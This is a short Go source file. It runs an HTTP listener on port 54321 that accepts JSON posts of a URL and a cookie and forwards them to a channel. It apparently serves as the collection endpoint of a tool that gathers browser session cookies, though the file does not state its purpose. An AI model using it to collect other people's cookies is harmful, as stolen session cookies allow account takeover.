package credentials

import (
	"encoding/json"
	"io"
	"net/http"
)

type RequestData struct {
	URL    string `json:"url"`
	Cookie string `json:"cookie"`
}

func Recieve(ch chan<- RequestData) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var credentials RequestData

		if err := json.Unmarshal(body, &credentials); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			panic(err)
		}

		ch <- credentials
	})

	http.ListenAndServe(":54321", nil)
}
